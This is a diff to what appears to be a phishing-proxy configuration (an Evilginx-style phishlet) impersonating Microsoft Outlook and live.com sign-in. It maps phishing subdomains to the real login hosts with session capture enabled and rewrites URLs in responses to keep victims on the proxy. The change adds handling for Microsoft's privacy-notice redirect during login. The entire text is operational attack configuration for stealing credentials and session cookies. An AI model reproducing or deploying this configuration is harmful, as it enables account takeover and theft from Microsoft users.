@@ -4,10 +4,12 @@ proxy_hosts:
   - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: true}
   - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
   - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: false, is_landing: false}
+  - {phish_sub: 'privacynotice.account', orig_sub: 'privacynotice.account', domain: 'microsoft.com', session: true, is_landing: false}
 sub_filters:
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/login.srf', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'https://privacynotice.account.microsoft.com/notice?ru=https://login.live.com/login.srf', replace: 'https://privacynotice.account.microsoft.com/notice?ru=https://login.live.com/login.srf', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
